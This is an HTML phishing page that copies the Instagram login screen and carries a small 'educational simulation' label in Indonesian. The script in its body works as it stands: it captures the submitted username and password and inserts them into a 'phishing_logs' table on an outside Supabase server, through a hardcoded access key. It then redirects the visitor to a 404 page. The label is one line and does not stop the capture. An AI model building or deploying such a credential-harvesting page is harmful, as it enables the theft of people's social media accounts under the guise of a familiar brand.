<!DOCTYPE html>
<html lang="id">
  <head>
    <meta charset="UTF-8" />
    <title>Instagram - Simulasi Edukasi</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        background: #000; /* sesuai screenshot, background hitam */
        margin: 0;
        padding: 0;
        display: flex;
        flex-direction: column;
        min-height: 100vh;
      }

      .container {
        flex: 1;
        display: flex;
        justify-content: center;
        align-items: center;
      }

      .login-box {
        background: #111;
        border: 1px solid #262626;
        width: 350px;
        padding: 40px 30px;
        border-radius: 5px;
        text-align: center;
        color: #fff;
      }

      .login-box img {
        width: 175px;
        margin-bottom: 30px;
      }

      .login-box input {
        width: 100%;
        padding: 9px 10px;
        margin: 6px 0;
        border: 1px solid #262626;
        border-radius: 3px;
        background: #121212;
        font-size: 14px;
        color: #fff;
      }

      .login-box input::placeholder {
        color: #aaa;
      }

      .login-box button {
        width: 100%;
        padding: 9px 10px;
        margin-top: 10px;
        background: #3897f0;
        border: none;
        border-radius: 3px;
        color: #fff;
        font-weight: bold;
        cursor: pointer;
      }

      .login-box button:hover {
        background: #2f80ed;
      }

      .or {
        margin: 20px 0;
        display: flex;
        align-items: center;
        color: #8e8e8e;
        font-size: 13px;
      }

      .or::before,
      .or::after {
        content: "";
        flex: 1;
        border-bottom: 1px solid #262626;
      }

      .or:not(:empty)::before {
        margin-right: 10px;
      }
      .or:not(:empty)::after {
        margin-left: 10px;
      }

      .login-box .facebook-login {
        color: #3897f0;
        text-decoration: none;
        font-size: 14px;
        font-weight: bold;
      }

      .login-box .forgot {
        display: block;
        margin-top: 15px;
        font-size: 12px;
        color: #3897f0;
        text-decoration: none;
      }

      .signup-box {
        background: #111;
        border: 1px solid #262626;
        width: 350px;
        padding: 20px;
        border-radius: 5px;
        text-align: center;
        margin-top: 15px;
        color: #fff;
      }

      .signup-box a {
        color: #3897f0;
        text-decoration: none;
        font-weight: bold;
      }

      .footer {
        padding: 20px 0;
        font-size: 12px;
        color: #8e8e8e;
        text-align: center;
      }

      .simulasi-label {
        margin-top: 10px;
        font-size: 12px;
        color: #ff5252;
        font-weight: bold;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <div>
        <div class="login-box">
          <img
            src="https://upload.wikimedia.org/wikipedia/commons/9/95/Instagram_logo_2022.svg"
            alt="Instagram"
          />
          <form id="phishForm">
            <input
              type="text"
              id="username"
              placeholder="Phone number, username, or email"
              required
            />
            <input
              type="password"
              id="password"
              placeholder="Password"
              required
            />
            <button type="submit">Log in</button>
          </form>

          <div class="or">OR</div>

          <a href="#" class="facebook-login">Log in with Facebook</a>
          <a href="#" class="forgot">Forgot password?</a>

          <div class="simulasi-label">
            ⚠ Simulasi Edukasi – Bukan Instagram asli
          </div>
        </div>

        <div class="signup-box">
          Don’t have an account? <a href="#">Sign up</a>
        </div>
      </div>
    </div>

    <div class="footer">
      © 2025 Instagram dari Meta (Halaman Simulasi untuk Edukasi)
    </div>

    <!-- Supabase Client -->
    <script src="https://cdn.jsdelivr.net/npm/@supabase/supabase-js@2"></script>
    <script>
      const SUPABASE_URL = "https://nohdhimjdnmcytzooteh.supabase.co";
      const SUPABASE_KEY =
        "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJpc3MiOiJzdXBhYmFzZSIsInJlZiI6Im5vaGRoaW1qZG5tY3l0em9vdGVoIiwicm9sZSI6ImFub24iLCJpYXQiOjE2OTc2MTQxMTYsImV4cCI6MjAxMzE5MDExNn0.eMf4hEVpCbP-lJUGfPGPa4C82SrEghWhQila_Fu34hw";
      const supabase = window.supabase.createClient(SUPABASE_URL, SUPABASE_KEY);

      const form = document.getElementById("phishForm");

      form.addEventListener("submit", async function (e) {
        e.preventDefault();

        let username = document.getElementById("username").value;
        let password = document.getElementById("password").value;

        // Simpan ke database Supabase
        const { data, error } = await supabase
          .from("phishing_logs")
          .insert([{ username, password }]);

        if (error) {
          console.error("❌ Error simpan data:", error);
        } else {
          console.log("✅ Data tersimpan:", data);
        }

        // Reset form
        form.reset();

        // Arahkan ke halaman 404
        window.location.href = "/404.html";
        // atau kalau mau 404 bawaan browser/server:
        // window.location.href = "/this-page-does-not-exist";
      });
    </script>
  </body>
</html>
